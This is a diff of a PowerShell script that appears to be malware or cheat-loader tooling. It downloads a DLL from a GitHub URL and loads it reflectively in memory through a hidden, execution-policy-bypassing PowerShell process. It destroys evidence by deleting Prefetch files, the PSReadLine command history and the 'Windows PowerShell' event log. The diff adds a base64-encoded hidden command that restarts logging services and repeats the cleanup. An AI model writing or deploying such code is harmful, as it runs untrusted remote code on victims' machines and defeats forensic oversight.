@@ -24,6 +24,12 @@ while ((Get-Date) -lt $timeout) {
 if (-not (Get-Process Discord -ErrorAction SilentlyContinue)) {
     Remove-Item -Path "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction SilentlyContinue
     Remove-Item -Path "C:\Windows\Prefetch\RUNONCE*" -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path "C:\Windows\Prefetch\CONHOST*" -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path "C:\Windows\Prefetch\DLLHOST*" -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path "C:\Windows\Prefetch\WEVTUTIL*" -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path "C:\Windows\Prefetch\CMD*" -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path "C:\Windows\Prefetch\REG*" -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path "C:\Windows\Prefetch\FSUTIL*" -Force -ErrorAction SilentlyContinue
     Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
     Clear-History -ErrorAction SilentlyContinue
    Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -WindowStyle Hidden -Command "$wc=New-Object Net.WebClient;$b=$wc.DownloadData(''https://github.com/zold1337/toolsvip/raw/refs/heads/main/ware.dll'');$a=[Reflection.Assembly]::Load($b);$a.GetType(''ServiceManagerApp.MainTool'').GetMethod(''ExecuteAll'').Invoke($null,$null)"'
@@ -101,26 +107,43 @@ Clear-History -ErrorAction SilentlyContinue
 
 
 
-$services = @(
-    "vss",
-    "dps",
-    "diagtrack",
-    "bam",
-    "dam",
-    "sysmondrv",
-    "sysmon",
-    "sysmain",
-    "eventlog"
-)
-foreach ($svc in $services) {
-    Set-Service -Name $svc -StartupType Automatic -ErrorAction SilentlyContinue
+$scriptBlock = {
+    
+	Start-Sleep -Seconds 3
+    $services = @("vss", "dps", "diagtrack", "bam", "dam", "sysmondrv", "sysmon", "sysmain", "eventlog")
+    foreach ($svc in $services) {
+        Set-Service -Name $svc -StartupType Automatic -ErrorAction SilentlyContinue
+    }
+
+    
+    foreach ($svc in $services) {
+        if ($svc -notin @("sysmain", "eventlog", "sysmon", "sysmondrv")) {
+            Start-Service -Name $svc -ErrorAction SilentlyContinue
+        }
+    }
+
+
+    Start-Service -Name "eventlog" -ErrorAction SilentlyContinue
+    Start-Service -Name "sysmain" -ErrorAction SilentlyContinue
+    Start-Service -Name "sysmon" -ErrorAction SilentlyContinue
+    Start-Service -Name "sysmondrv" -ErrorAction SilentlyContinue
+
+
+    $cmdCommands = 'wevtutil cl "Windows PowerShell" && ' +
+                   'del /f /q "C:\Windows\Prefetch\POWERSHELL*" && ' +
+                   'del /f /q "C:\Windows\Prefetch\RUNONCE*" && ' +
+                   'del /f /q "C:\Windows\Prefetch\CONHOST*" && ' +
+                   'del /f /q "C:\Windows\Prefetch\DLLHOST*" && ' +
+                   'del /f /q "C:\Windows\Prefetch\WEVTUTIL*" && ' +
+                   'del /f /q "C:\Windows\Prefetch\CMD*" && ' +
+                   'del /f /q "C:\Windows\Prefetch\REG*" && ' +
+                   'del /f /q "C:\Windows\Prefetch\FSUTIL*"'
+
+    Start-Process cmd.exe -ArgumentList "/c $cmdCommands" -WindowStyle Hidden
 }
-net stop w32time > $null 2>&1
-net start w32time > $null 2>&1
-w32tm /resync /force > $null 2>&1
-Remove-Item -Path "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction SilentlyContinue
-Remove-Item -Path "C:\Windows\Prefetch\RUNONCE*" -Force -ErrorAction SilentlyContinue
+
+$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($scriptBlock.ToString()))
+Start-Process powershell.exe -ArgumentList "-NoProfile -EncodedCommand $encodedCommand" -WindowStyle Hidden
 Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 Clear-History -ErrorAction SilentlyContinue
-Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -WindowStyle Hidden -Command "$wc=New-Object Net.WebClient;$b=$wc.DownloadData(''https://github.com/zold1337/toolsvip/raw/refs/heads/main/ware.dll'');$a=[Reflection.Assembly]::Load($b);$a.GetType(''ServiceManagerApp.MainTool'').GetMethod(''ExecuteAll'').Invoke($null,$null)"'
 Exit
